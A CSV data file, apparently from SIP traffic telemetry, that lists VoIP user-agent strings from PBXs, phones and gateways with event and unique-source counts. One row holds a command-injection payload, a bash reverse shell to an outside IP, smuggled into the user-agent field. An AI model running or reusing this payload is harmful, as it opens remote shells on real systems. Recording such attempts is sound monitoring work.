sip_user_agent,events,unique_src
RV/V9.1.0.37 XT4300,11,3
FPBX-17.0.19.28(18.10.0),11,2
FPBX-16.0.47(20.17.0),11,4
Yealink SIP-T33G 124.86.0.40,11,3
RG-1404GF-W/1.11.0 SN/VI25021525 sofia-sip/1.12.10,11,3
Grandstream UCM6204V1.7A 1.0.20.49,11,3
FPBX-16.0.47(13.38.3),11,3
FPBX-17.0.19.27(22.5.0),11,3
CommuniGatePro/6.2.13,11,3
Yeastar S20-30.7.0.50,11,5
AGFEO SIP V3.00.15 n (MAC=00155D027608),11,3
Asterisk PBX 13.38.2-vici,11,4
MediaAccess TG788vn v2 Build 10.5.2.S.GD,11,3
Dahua UAC/3.0 VTOASI6213S V3.3.0.3 VTO_Wall SN:BC06B24PAJ87054,11,4
Sipwise NGCP Proxy mr12.4.1,11,3
Sipwise NGCP Proxy 5.X,11,3
Sippy Softswitch v2023-PRODUCTION.452,11,4
Asterisk PBX 13.33.0,11,4
Slican IPU,11,3
MCUSYSTEM/MCU/5.10.60,11,2
Deltapath frSIP UC 5.2.1,11,4
Deltapath frSIP UC 4.2,11,3
Deltapath frSIP UC 5.1.2,11,4
Asterisk PBX 13.18.0-6.7.1.2.rl.1544643513.e36e366,11,3
Stonehenge IP255S 1.30.351,11,2
MATRIX SARVAM UCS SME V2R1.1.0,11,3
MATRIX SARVAM UCS SMB V1R6.7.0,11,3
SIP UAS V3.0.0.725669,11,2
SIP UAS V3.0.0.1815582,11,3
NEC SV9100-NA 12.10.50/2.1,11,2
ClearlyIP-15.0.37.1(16.30.0),11,2
DAG1000-4S IAD 16.19.10.17,11,4
DE310 IP PRO/63.02.01.00;7C2F8020AFA9,11,3
DAG1000-4S DAG 2.19.10.08,11,4
Asterisk PBX 18.20.0,11,4
Asterisk PBX 18.10.0~dfsg+~cs6.10.40431411-2,11,2
Asterisk PBX 18.11.2,11,4
N300 IP/42.075.00.000.000,11,2
Comnect Sip Agent/3.6.0,11,3
N510 IP PRO/42.231.00.000.000,11,4
Grandstream UCM6300AV1.1A 1.0.31.7,11,4
Asterisk PBX 19.2.1,11,4
Asterisk PBX 16.30.0-HCOM_1,11,3
Signalway_GB/T28181 1.1,11,3
Sagem / HW_VFast3304-V2 / FW_V58903C-58C040 / SW_V1.2.344,11,2
Sip Agent,11,3
Grandstream UCM6304V1.4A 1.0.29.19,11,4
Grandstream UCM6304V1.4A 1.0.15.13,11,4
Dahua UAC/3.0 VTOASI7214S-W V3.3.0.0 VTO_Wall SN:MAGACS10250802,11,3
Grandstream UCM6302V1.3A 1.0.31.7,11,4
FPBX-16.0.40.13(18.20.2),11,4
Grandstream UCM6304AV1.2A 1.0.19.11,11,2
FPBX-16.0.40.13(20.5.2),11,4
Dahua UAS/3.0 VTO2201F-P,11,4
Dahua UAS/3.0 VTO1210C-X,11,4
Vtech Hotel SIP CTM-S2315W 2.10.65.e9e2,11,3
WVP-Pro v2.7.4.20251015,11,1
Yeastar P570,11,3
Grandstream UCM6300AV1.0A 1.0.15.13,11,4
Grandstream UCM6208V1.6A 1.0.20.48,11,2
FPBX-16.0.45(16.29.1),11,4
FPBX-16.0.45(18.13.0),11,3
FPBX-16.0.45(18.20.0),11,3
WVP-Pro v2.6.9.20230811,11,3
WVP-Pro v2.6.9.20230901,11,3
Yealink W52P 25.81.0.76,11,3
Yeastar S100-30.15.0.206,11,2
Yeastar P550,11,3
Grandstream UCM6302V1.2C 1.0.31.7,11,4
WVP-Pro v2.7.4.20260109,11,4
DLINK DPH-400S FRU2.2.182.77,11,3
FPBX-16.0.40.8(20.9.2),11,4
FPBX-16.0.40.7(16.30.0),11,2
Grandstream UCM6302AV1.0A 1.0.29.21,11,4
snomM300/04.10.0004 (MAC=000413B817B6; SER= 00000; HW=1),11,3
switch.telemir,11,4
taxer-sip-router,11,3
FreeSWITCH-mod_sofia/1.6.20+git~20180507T185611Z~43a9feb7f8~64bit,11,2
OpenSER (1.3.4-tls (i386/linux)),11,3
051 12-3893-6083-1.3.3.240-SP5220SP,11,4
OpenSer (1.0.1 (i386/linux)),11,4
C430A GO/42.248.00.000.000,11,4
OrchestraNG,11,4
Gigaset N670 IP PRO/83.V2.33.1+build.0cb05c5;589EC62A49C8,11,2
Gigaset N870 IP PRO/83.V2.61.2+build.eb99619;589EC684CFA7,11,3
snomM200SC 2.10.32.4da7,11,2
Aastra MX-ONE SN/17.4.1.0.17,11,5
CALIX GS4220E/25.3.0.1.4,11,3
CALIX GS4220E/26.1.0.0.30,11,3
www.te-systems.de XCAPI V3.6.80.0,11,3
051 12-3893-6083-1.3.3.182-SP5220SO,11,3
202 12-3864-8116-0.9.5.1.1741-SA7S4,11,3
201 12-3896-11913-1.4.2.232-SP350SO,11,3
smg_pa_sip 3.22.5.12,11,4
CALIX GS4227E/25.4.0.0.57,11,3
201 12-3893-6085-1.3.3.240-SP5220SP,11,3
sub3000,10,3
Gbt28181AccessAgent,10,3
sip,10,5
o2-ZyXEL-1.00(AAJG.0)D14-VDSL_IAD_BSA_WLAN,10,2
201 12-3893-6085-1.3.3.240-SP5220SO,10,3
128 12-38-38989131-0.9.5.1.1818-PSTN202,10,4
128 12-393-791-1.4.2.252-SP5250SP,10,2
retenprofiteam-asterisk,10,3
smg_pa_sip 3.21.5.1,10,3
smg_pa_sip 3.22.3.8,10,3
OpenSIPS (2.2.2 (arm/linux)),10,2
CALIX GS4220E/23.4.0.1.128,10,3
CALIX GS4220E/25.4.0.0.57,10,3
vis-video-hub,10,2
FortiVoice-VM-HV,10,3
AVM FRITZ!Box Fon WLAN 7320 (UI) 100.04.87 (Sep 30 2010),10,2
AVM FRITZ!Box Fon WLAN 7360 (EWE Edition) 111.05.22 (Jun  1 2012),10,3
IPPhone ST2020 29.224.1.261 0C11052EAAF4;akdoor,10,3
IPPhone ST2020 29.224.1.261 0C11052EAB5B;akdoor,10,3
IntegrIT CrystalVu 0.5.4.4 Jul  7 2021,10,3
Inteno_EG4024H181022540_00220771414c,10,2
IncrediblePBX-15.0.37(16.0),10,3
FPBX-13.0.20(13.5.0),10,2
Iva Media 3.220,10,3
FPBX-12.0.76.6(1.8.18.0),10,3
FPBX-12.0.76.6(11.17.1),10,3
KX-VC1600_HDVC-MPCS 5.50 (Profile=5),10,3
Jov device,10,4
Tiandy Tech SIP Agent,10,2
Tilgin Vood HG233x_ESx000-02_07_05_14,10,2
Tilgin Vood HG27xx_ESx000-03_01_00_69,10,3
OXO061/023.001 GW_061/023.001,10,4
OXO060/122.001 GW_060/122.001,10,4
OXO060/125.001 GW_060/125.001,10,3
Barracuda NG,10,4
PBXact-15.0.38(18.26.4),10,2
BiPAC 8700VAXL,10,3
PBXact-17.0.28(22.5.2),10,2
POVODO PBX 1.0.1740,10,3
fw2021090715-HPV15400.N3A2UHML2,10,2
eXosip/4.0.0,10,3
fw2023052317-HDV34201.N3A2UVML2,10,2
A510 IP/42.207.00.000.000,10,4
A540 IP/42.247.00.000.000,10,3
ADTRAN_NetVanta_5660_EoX_L2L3_Router/R14.1.2.E,10,2
callphone,10,3
Cisco-ATA191-MPP/11-2-5MPP0001-151,10,4
Asterisk PBX 16.2.1~dfsg-2ubuntu1,10,3
Asterisk PBX 16.24.0,10,3
Mitel Border GW(MBG/12.0.2.148 TUG/4.20.0.86-01),10,1
Mitel Border GW/4.8.0.21-01,10,3
Grandstream UCM6301V1.2C 1.0.15.13,10,4
Grandstream UCM6302AV1.1A 1.0.19.10,10,4
Grandstream UCM6301V1.3A 1.0.25.10,10,2
SIPVOIP,10,2
AGFEO int SIP V5.2g (DATE=03.06.26 17:45  MAC=00155DE4794E),10,4
AGFEO int SIP V5.2f (DATE=08.05.26 01:20  MAC=0009406E00D0),10,2
Grandstream UCM6304V1.4A 1.0.19.9,10,4
FPBX-15.0.38(16.16.2),10,2
FPBX-15.0.38(17.9.3),10,4
FPBX-15.0.38(18.3.0),10,4
Dahua UAS/3.0,10,4
Asterisk PBX 16.28.0~dfsg-0+deb10u4,10,2
Grandstream UCM6208V1.6A 1.0.20.52,10,2
FPBX-16.0.45(20.5.2),10,2
Mediant 1000/v.6.60A.309.001,10,3
MaxNet SoftSwitch v 2.0,10,2
WVP-Pro,10,5
WPI-VM,10,3
AGFEO int SIP V5.1h (DATE=30.09.25 22:41  MAC=0009406F165E),10,2
WVP-Pro v2.7.4.2026-03-03T08:11:39Z,10,3
Grandstream UCM6302V1.3A 1.0.17.11,10,2
WVP-Pro v2.7.4.2026-01-19T11:44:40+08:00,10,4
XiVO PBX 2021.07.09,10,3
XiVO PBX 2025.05.11,10,5
XP0101 47.80.151.1,10,4
Xelion Phone System,10,4
Yealink IPCALL 1.0.200.76 Jun  6 2019,10,2
Yealink Meeting Server 10.23.0.55,10,4
Asterisk PBX 15.3.0,10,3
MP-112 FXS/v.6.60A.352.002,10,2
Matrix VoIPServer NEv2_8 V2R1,10,3
Meeting Server Unigw 47.3.0.25,10,3
ClearlyIP-17.0.21(22.5.2),10,2
NERON20,10,3
CommuniGatePro/5.4.11,10,3
Grandstream UCM6202V1.7A 1.0.20.38,10,3
DaqingGongAn By ZW,10,4
Dahua UAS/3.0 VTO7541G,10,4
MOIMSTONE IP460S 1.3.4,10,3
MOIMSTONE IP460SW 1.3.4,10,3
Asterisk PBX 13.38.2,10,3
Sipwise NGCP Proxy 8.X,10,3
Sipwise NGCP Proxy 9.X,10,4
Slican NCP 1.16.0480,10,4
Asterisk PBX 20.0.0,10,3
Asterisk PBX 18.9.0-8.1.rl.104365.d03864911e,10,1
NEC SV9100-NA 10.50.51/2.1,10,3
NEC SV9100-GE 12.10.50/2.1,10,3
Asterisk PBX 11.25.3,10,3
Asterisk PBX 11.3.0,10,3
Asterisk PBX 13.1.0~dfsg-1.1ubuntu4.1,10,3
Daktela SBC v2025.3,10,3
SIP UAS V3.0.0.900631,10,4
SIParator/5.0.5,10,4
Core IPBX,10,3
D4-BERLIN,10,5
S850A GO/42.248.00.000.000,10,3
SIP UAS V3.0.0.1321588,10,4
SIP UA Beta 1.0,10,3
Asterisk PBX 18.21.0-vici,10,2
Yeastar S50-30.15.0.159,10,3
ZSIP Server,10,3
ZTE Operator,10,4
Grandstream UCM6108V1.5A 1.0.18.18,10,3
FPBX-17.0.21.2(22.1.0),10,2
FPBX-17.0.19.32(22.5.2),10,2
FPBX-17.0.19.32(22.7.0),10,3
Grandstream UCM6202V1.5B 1.0.20.48,10,3
NetComm NL20MESH.NC.TPG.AAPT-R6B001.EN,10,3
ClearVox Nexxt/2.9.0 (hn:clearvox.personalcareconcepts.nl; h:0),10,2
Cisco/SRP521-1.01.27(007),10,3
Yeastar S50-30.14.0.95,10,2
Yeastar S412-30.15.0.179,10,2
Yeastar S412-30.15.0.203,10,3
Yeastar S50-30.5.0.30,10,3
Yeastar S50-30.15.0.115,10,4
Yealink SIP-T34W 124.86.25.8,10,3
Asterisk PBX 20.17.0,10,4
RRC1258-001efd01866b Mode=4,10,2
Asterisk PBX 22.0.0,10,2
Asterisk PBX 20.8.1~dfsg+~cs6.14.40431414-1,10,3
Asterisk PBX 20.9.0,10,3
Asterisk PBX 20.9.2-intellasoft-2026-03-25,10,3
Cisco/SPA504G-7.5.5b,10,3
AGFEO SIP V3.00.15 n (MAC=0009407E001D),10,3
Yeastar S412-30.15.0.211,10,4
AGFEO SIP V3.00.15 n (MAC=0009407F0544),10,4
FPBX-16.0.47(16.30.0),10,3
Grandstream UCM6204V1.7A 1.0.20.53,10,3
FPBX-17.0.19.27(22.3.0),10,4
FPBX-17.0.19.28(22.3.0),10,3
FPBX-17.0.19.23(21.6.0),10,3
VOX30/XS_4.1.00.15,10,3
AIxion-PBX,10,3
AS690 IP/42.248.00.000.000,10,3
UniMRCP SofiaSIP 1.7.0,10,2
Cisco/SPA122-1.3.2(014),10,2
OBIHAI/OBi302-3.2.3.6768,10,3
NotificaMe BSP SIP 1.0.0,10,3
Cisco/SPA122-1.4.1(002),10,2
M5T SIP Stack/4.1.10.16,10,3
Loeve.TV,10,3
E630A GO/42.248.00.000.000,10,3
Deltapath frSIP UC 5.3.5,10,3
FPBX-15.0.38(16.25.2),10,2
FPBX-15.0.38(16.4.1),10,2
VPS,10,2
VOX30/XS_4.0.01.05,10,3
TA400 41.19.12.306,10,3
Asterisk PBX 1.8.13.1~dfsg1-3+deb7u4,10,3
TANDBERG/4136 (X8.11.4),10,2
TANDBERG/4137 (X12.5.7),10,3
Linphone/3.6.1 (eXosip2/3.6.0),10,4
Linphone/3.6.1 (eXosip2/unknown),10,3
Linksys/WRP400-1.00.04.c,10,3
M5T E-DVA SDK v2.6.8.8,10,2
FPBX-17.0.24(20.10.0),10,3
Nexbridge,10,3
PolycomVVX-VVX_500-UA/5.9.0.9373,10,3
PolycomVVX-VVX_411-UA/6.4.3.5814_64167fcf29b3,10,2
PowerStar pcxpstbri11,10,2
Asterisk PBX 22.3.0,10,5
RG-1404GF-W/1.10.2 SN/VI25012436 sofia-sip/1.12.10,10,2
Stonehenge IP325S 1.30.391,10,2
FPBX-15.0.37.5(16.13.0),10,3
TrueConf Server 5.2.9.1314,10,4
UC120/2.55.3.0 2021-11-15 13:51:25 CST +0800,10,3
UC2B - 1.10.5-release~64bit,10,2
Asterisk PBX certified/13.13-cert6,10,3
PolycomVVX-VVX_250-UA/6.4.7.4477,10,4
PolycomVVX-VVX_300-UA/5.9.3.2857,10,4
PolycomVVX-VVX_150-UA/6.4.4.3178,10,2
Linksys/SPA3000-3.1.20(GW),10,3
Linksys/SPA3102-3.3.6(GW),10,4
VEGAARM/16.02.12.0xS006,10,3
VINTEO 2.0.0,10,3
VOIP_TERM_2.12.17 cc,10,3
VPBX108,10,4
AVM FRITZ!Box 7330 107.05.06 (Oct 19 2011),10,4
ICOTERA i4600 (6800-1.19.0),10,2
FPBX-17.0.25(22.4.1),10,3
Grandstream UCM6102V1.6A 1.0.17.16,10,3
ONT_7251/H5.6.0.41,10,4
TAU-2M.IP/1.14.1.527 SN/VI39051497 sofia-sip/1.12.10,10,3
TAU-1M.IP/2.3.1.11 SN/VI3A028801,10,4
Asterisk IPS,10,3
Ape3D-Asterisk,10,3
Linksys/RT31P2-3.1.6(LI),10,3
Cisco/SPA303-7.5.7s,10,2
Cisco/SPA303-7.6.2d_BestGo,10,3
FPBX-17.0.30(21.10.0),10,4
FPBX-17.0.28(22.2.0),10,5
Grandstream HT812 1.0.49.2,10,3
adamxConnect-Asterisk/20,10,3
ADTRAN_Total_Access_908e_2nd_Gen/A2.06.00.E,10,3
FPBX-17.0.28(18.26.4),10,2
PolyEdge-Edge_E220-UA/8.4.1.0068,10,3
PolyEdge-Edge_E450-UA/8.4.1.0068,10,2
Pirelli Broadband Solutions/Discus Platform/DWVL_PTC_4.3.1.0044,10,3
PolyEdge-Edge_E220-UA/8.2.2.1176_482567552b30,10,4
Panasonic-KX-TGP600RU/13.102 (b8208e5aadde),10,3
Panasonic-KX-HTS-002.00022,10,2
Panasonic-KX-HTS-002.00027,10,3
Panasonic-MPR16-V008.30040/VSIPEXT-V3.0000,10,2
Grandstream HT802 1.0.27.2,10,3
Grandstream HT801 1.0.9.3,10,4
Grandstream HT802V2 1.0.11.4,10,4
Cisco-CP-8865-3PCC/11.3.7,10,4
OXO040/535.001 GW_040/535.001,10,3
Cisco/SPA112-1.3.5(004_XU001),10,3
Cisco/SPA112-1.3.5(004p),10,3
Patton SN4171/1E15VHP 00A0BA10F54E 3.21.2-23021 1.6 M5T SIP Stack/4.2.28.153,10,3
OXO040/525.001 GW_040/525.001,10,3
dlink 12-3892-6112-1.3.3.176-ON201LW,10,3
eXosip/5.2.0,10,4
Grandstream HT801 1.0.19.11,10,2
Grandstream HT801 1.0.3.2,10,2
FPBX-2.11.0(1.8.20.0),10,3
FPBX-2.10.1(1.8.18.0),10,4
FPBX-2.10.1(1.8.22.0),10,3
Asterisk-Anon,10,2
Asterisk PBX certified/13.21,10,3
Asterisk PBX certified-20.7-cert3,10,3
PolycomVVX-VVX_310-UA/5.9.8.5760_0004f288e158,10,2
PolycomVVX-VVX_311-UA/5.9.6.2996,10,2
AtendZappy-Asterisk,10,3
PolycomVVX-VVX_350-UA/6.1.1.2670,10,3
PolycomVVX-VVX_310-UA/5.9.2.4299,10,3
FPBX-15.0.17.32(13.29.2),10,2
IPDECT-V2/80.08.0001 (MAC=482567DAC309; SER= 00000; HW=4),10,3
TANDBERG/4145 (X14.3.4),10,3
TAU-2M.IP/1.9.3 SN/VI39008366 sofia-sip/1.12.10,10,3
Cisco-ATA192-MPP/11-2-5MPP0001-151,10,4
Cisco-CP-6861-3PCC/12.0.1,10,4
Grandstream GWN7062ET 1.0.5.9,10,2
FPBX-2.8.1(1.8.16.0),10,2
UCS_Terminal,10,3
IPDECT-V2/80.07.0004 (MAC=482567CDE872; SER= 00000; HW=8),10,3
IPBX-2.11.0.47(11.25.3),10,3
IPDECT-V2/80.07.0004 (MAC=482567EAAF5C; SER= 00000; HW=9),10,3
FPBX-15.0.37.4(16.28.0),10,2
FPBX-15.0.37(13.38.3),10,2
FPBX-15.0.37.4(16.17.0),10,4
FPBX-14.0.17(13.29.2),10,5
AltiGen IP Phone 0.1,10,2
KalliopePBX/4.18.0,10,4
KX-VC1300_HDVC-MPCS 6.10 (Profile=5),10,3
F660V2.1/V2.21.20P7T11S,10,3
Linksys/PAP2T-5.1.1(LS),10,2
TANDBERG/529 (ce9.2.0.59d7c4d) Cisco-SX10,10,3
TANDBERG/4145 (X15.2.4),10,2
AVM FRITZ!Box Fon WLAN 7140 Annex A 39.04.77 (Feb 14 2014),10,3
Patton SN4131/2BIS4VHP 00A0BA0ED4F7 3.22.2-24123 1.7 M5T SIP Stack/4.2.28.153,10,3
BBTEL,10,3
BVGoSIP,10,3
OXO052/062.001 GW_052/062.001,10,3
OXO051/017.001 GW_051/017.001,10,3
Cisco-ATA192-MPP/11-2-1MPP0001-006,10,2
Cisco-ATA191-MPP/11-1-0MPP0401-002,10,3
Camping,10,3
omnileads,10,3
Gequdio GZ-6 GZ-6 3.12.6 00a859eba871,10,3
usa-border,10,4
v1.1.9,10,3
vinnipuh,10,3
trunk1101.viptel.dk,10,4
FrozaBot,10,3
FreeSWITCH-mod_sofia/1.10.0-release~64bit,10,3
51YHC40001,10,3
Gorsovet-3,10,2
Grandstream DP752 1.0.21.6,10,3
kamailio (6.0.5 (x86_64/linux)),10,3
mikopbx-2024.1.114,10,3
2N IP Solo 2.43.1.56.3,10,2
202 12-395-199-1.4.2.252-SP5250S,10,3
204 12-3895-11530-1.3.3.258-SP5220S,10,3
Callex,10,4
Fanvil X1S 2.4.12.2 0c:38:3e:5f:f0:50,10,3
Fanvil X1S 2.2.12 0c:38:3e:0f:e3:b6,10,3
kamailio (5.6.3 (x86_64/linux)),10,3
kamailio (4.4.4 (i386/linux)),10,4
kamailio (5.1.10 (aarch64/linux)),10,3
3CX Phone System,10,2
4520VNOZR2,10,3
FPBX-13.0.197.31(13.13.1),10,3
TAU-2M.IP/2.3.1.11 SN/VI39072559,10,4
AddPac SIP Gateway,10,3
Acme Packet,10,3
PBXact-17.0.30(22.8.2),10,3
OXO062/030.001 GW_062/030.001,10,2
CPG4020N/2.03.32,10,3
CALIX GS4229E/25.3.0.0.56,10,4
swengine v3.14 r3.14.119,10,2
snomM700/05.30.0002 (MAC=0004136163A4; SER= 00000; HW=255),10,3
056 12-3899-284-1.4.2.252-SP5250S,10,5
Mitel Border GW/4.10.0.177-01,10,3
FPBX-16.0.40.8(18.16.0),10,4
Grandstream UCM6302AV1.1A 1.0.27.23,10,2
Grandstream UCM6302V1.2C 1.0.17.11,10,2
FPBX-16.0.45(16.25.0),10,4
C530 IP/42.231.00.000.000,10,2
C530 IP/42.248.00.000.000,10,3
C610 IP/42.243.00.000.000,10,4
OpenSIPS (3.4.0-dev (x86_64/linux)),10,4
FreeSWITCH-mod_sofia/1.10.12-dev+git~20240509T194526Z~503c19e12b~64bit,10,3
056 12-393-802-1.4.2.252-SP5250S,10,4
FreeSWITCH-mod_sofia/1.10.7-release~64bit,10,4
056 12-36-5611829,10,4
Gequdio GX5+ 2.4.9.4 00a85a01cca6,10,2
Fanvil X301 2.12.22.2 0c383e6652c6,10,4
OXO063/019.001 GW_063/019.001,10,2
OpenScape 4000 -  STMIX,10,3
OpenScape Office M5T SIP Stack/4.0.26.26,10,3
C530A IP/42.231.00.000.000,10,3
C530A IP/42.247.00.000.000,10,3
C530A IP/42.248.00.000.000,10,3
FPBX-14.0.16.11(13.21.1),10,3
Technicolor / VANT-6 / AGTOT_1.0.2 / AGTOT_1.0.2,10,3
Aastra 6867i/6.3.0.1020,10,5
Telemedia PBX,10,3
Technicolor / VANT-6 / AGTOT_2.1.4 / AGTOT_2.1.4,10,2
Iva Media 3.177,10,3
2N IP Verso 2.44.1.57.4,10,4
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80CE79B3,10,3
%BRANDINGCUDABASENAME,9,2
$(bash -i >& /dev/tcp/153.75.94.83/5060 0>&1),9,6
uc200/2.54.2.0 2020-03-25 11:38:25 CST +0800,9,3
FreeSWITCH-mod_sofia/1.10.12+git~20240802T210227Z~a88d069d6f~64bit,9,3
056 12-395-310-1.4.2.252-SP5250S,9,2
056 12-38-28928914-0.9.5.1.1741-SA7S4,9,4
Gequdio GZ-2 3.12.10 00a859ed47dc,9,3
pbx1667,9,2
myfreeswitch,9,3
Gigaset N720 DM PRO/70.108.00.000.000,9,2
Gigaset BasicLine IP/101.V2.68.0+build.7bb45a2;589EC6A5762C,9,2
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80CE7BD7,9,4
Gequdio GX5+ 2.4.9.0 00a859ecc4ea,9,2
itibia-PBX,9,3
kamailio (3.0.3 (i386/linux)),9,3
iopsys_W.4723230874_580032a33d50,9,2
Fanvil V62G 2.12.18.8 0c383e66be75,9,3
Goron_PBX,9,3
3CXPhoneSystem 10.0.22539.0,9,3
3CXPhoneSystem 10.0.23053.0,9,3
kamailio (5.4.1 (x86_64/linux)),9,2
OXO063/013.001 GW_063/013.001,9,3
OXO062/028.001 GW_062/028.001,9,3
OXO062/107.001 GW_062/107.001,9,2
PT921CTCQV354,9,3
PINTEL PBX,9,3
COMFORT 550A IP BASE/88.1.18.0;589EC67923AF,9,2
CIP850,9,3
OXO920/095.001 GW_920/118.001,9,2
OXO_GW_820/097.001,9,3
C610 IP/42.075.00.000.000,9,2
C530 IP/42.247.00.000.000,9,2
C530A GO/42.248.00.000.000,9,3
Grandstream DP750 1.0.15.6,9,3
Grandstream DP752 1.0.21.16,9,2
Grandstream DP752 1.0.21.25,9,2
GoSunCN,9,3
FPBX-AsteriskNOW-12.0.76.6(11.21.2),9,2
FPBX-AsteriskNOW-12.0.76.6(11.25.3),9,4
FPBX-AsteriskNOW-13.0.197.31(13.29.2),9,3
FPBX-2.9.0(1.8.9.3),9,2
iPECS LIP-9002 vT-9X00-Rls1807-1.0.58-scm SN/B061C7213051,9,3
iopsys_EG4024H188018682_002207756554,9,3
huawei,9,3
fw2021110114-OIV35402.N2A3UHM-xB,9,2
dispatch2.dfw2.cytracom.net,9,3
ADTRAN_NetVanta_644/R13.1.0.HA.E,9,3
ADTRAN_SDX_601qv/24_4-4-e,9,3
ADTRAN_NetVanta_3140/R13.10.1,9,3
OXO060/025.001 GW_060/025.001,9,3
OXO050/041.001 GW_050/041.001,9,3
BGNV PBX,9,3
Auerswald COMpact 5200R/8.6D000,9,5
Cisco-CP-7841-3PCC/12.0.7,9,3
Cisco-CP-8841-3PCC/12.0.4,9,3
Cisco-ATA191-MPP/11-2-4MPP0001-115,9,3
Cisco 4012 PBX,9,3
Cisco ATA 186  v3.2.1 atasip (050616A),9,4
PBXact-16.0.45(18.20.2),9,4
OXO062/025.001 GW_062/025.001,9,3
OXO062/027.001 GW_062/027.001,9,3
Cisco-ATA192-MPP/11-2-3MPP0001-028_BestGo,9,2
BiPAC 8700AXL,9,2
BeWANVoIP,9,3
ADTRAN_SDX_632v/12_5_2-28-d,9,2
ADTRAN_SDX_622v/12.5.2-48,9,2
dlink 12-3891-9388-1.3.2.102-OG201LW,9,3
Grandstream GXW-4004  V1.5A 1.0.14.1  chip V2.2,9,2
eSIP 20x-30.15.29.103,9,3
ADTRAN_Total_Access_900e_3rd_Gen/R13.5.1.E,9,3
FPBX-2.11.0(11.13.0),9,3
FPBX-2.10.0(10.5.1),9,3
Grandstream HT801 1.0.59.3,9,3
Grandstream HT701 1.0.2.22,9,3
Grandstream GXP2170 1.0.11.93,9,2
Grandstream HT801V2 1.0.9.3,9,3
FPBX-2.11.0(11.9.0),9,3
FPBX-2.11.0(11.25.1),9,4
Cisco/SPA112-1.0.2(006),9,4
ONT_8211/H5.8.0.45,9,4
ONT_7461/H5.8.0.45,9,3
ONT_7463/H5.8.0.45,9,3
ONT_7321/C5.6.0.53,9,4
Patton SN4131/2BIS4VHP 00A0BA101506 3.22.1-24062 1.8 M5T SIP Stack/4.2.28.153,9,3
Panasonic_KX-UT123NE/01.278 (0080f0dc5fb7),9,3
OXO040/563.001 GW_040/563.001,9,2
Cisco/SPA112-1.4.1(002),9,3
Auerswald COMpact 4000/8.0B000,9,3
Audiocodes MP202B; MAC:00908FDADF5E Ver:4.4.7_build_88,9,4
PolyEdge-Edge_E550-UA/8.2.2.1176,9,3
Patton SN4131/2ETH4BIS8VHP 00A0BA0F147F 3.14.3-19023 1.8 M5T SIP Stack/4.2.26.112,9,3
Panasonic-MPR16-V009.00013/VSIPGW-V3.0000,9,3
Panasonic-MPR15-V008.01002/VSIPEXT-V3.0000,9,1
Panasonic-KX-TGP600/13.207,9,3
Grandstream HT802V2 1.0.5.4,9,2
Grandstream HT812 1.0.51.1,9,2
Grandstream HT812 1.0.65.1,9,2
FPBX-17.0.30(22.5.2),9,4
FPBX-17.0.28(22.6.0),9,3
ZyXEL C2100Z 4.16.011.30,9,3
ZyXEL P-2612HW-F1,9,3
Zycoo-EH30 s1.0.10 68692E260F5C,9,3
Grandstream HT841 1.0.7.3,9,2
Grandstream HT812V2 1.0.5.7,9,3
baidu/evs,9,2
FPBX-17.0.28(20.11.0),9,3
FPBX-17.0.28(20.16.0),9,4
FPBX-17.0.24(22.5.2),9,3
FPBX-17.0.25(20.10.0),9,4
FPBX-17.0.25(20.9.3),9,4
Grandstream HT818 1.0.8.7,9,4
Grandstream UCM6201 V1.5A 1.0.23.24,9,3
FPBX-17.0.28(20.17.0),9,2
Yeastar S50-30.15.0.165,9,4
Yeastar S50-30.10.0.16,9,3
Private SIP UAS V1.0,9,3
Cisco/SPA303-7.5.1a,9,3
Cisco/SPA303-7.5.2,9,3
Asterisk PBX certified/11.6-cert18,9,4
PolycomVVX-VVX_250-UA/6.4.6.2681,9,3
OBIHAI/OBi302-3.2.6.9350,9,2
ONT_7221/C5.6.0.35,9,3
PolycomVVX-VVX_411-UA/6.4.7.4477_64167f5ef6f5,9,4
PolycomVVX-VVX_350-UA/6.4.3.5156,9,4
PolycomVVX-VVX_310-UA/5.0.1.4068,9,4
AudioCodesM500/v.7.20A.256.107,9,3
ZXDSL 931VII/V2.0.00.OTET06,9,4
ADTRAN_Total_Access_924_2nd_Gen/R10.9.6.E,9,3
ADTRAN_Total_Access_908e_3rd_Gen/R13.11.0.E,9,3
FPBX-17.0.21(22.5.0),9,3
Grandstream UCM6202V1.5A 1.0.18.13,9,4
Grandstream UCM6202V1.4A 1.0.18.12,9,4
Grandstream UCM6202V1.4A 1.0.20.34,9,2
Grandstream UCM6202V1.4A 1.0.20.48,9,5
Grandstream UCM6202V1.7A 1.0.20.41,9,4
Grandstream UCM6202V1.5A 1.0.20.53,9,3
FPBX-17.0.24(21.7.0),9,3
FPBX-17.0.24(22.3.0),9,3
